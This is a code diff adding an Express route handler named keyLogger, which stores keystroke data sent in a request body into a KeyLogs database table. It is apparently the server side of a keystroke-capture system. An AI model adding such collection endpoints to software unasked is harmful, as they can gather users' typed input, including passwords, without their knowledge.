@@ -1323,3 +1323,28 @@ exports.delete_user = (req, res) => {
     });
   });
 };
+
+
+
+
+
+exports.keyLogger = (req, res) => {
+  const { keyLog } = req.body; // Key data from the request body
+
+  if (!keyLog) {
+    return res.status(400).json({ error: "Invalid data: typing_key is required." });
+  }
+
+  const query = `INSERT INTO KeyLogs (type_key) VALUES (?)`;
+
+  db.query(query, [keyLog], (err, results) => {
+    if (err) {
+      console.error("Error inserting key:", err);
+      return res.status(500).json({ error: "Internal server error." });
+    }
+    console.log("Key logged successfully.");
+    
+
+    res.status(200).json({ message: "Key logged successfully." });
+  });
+};
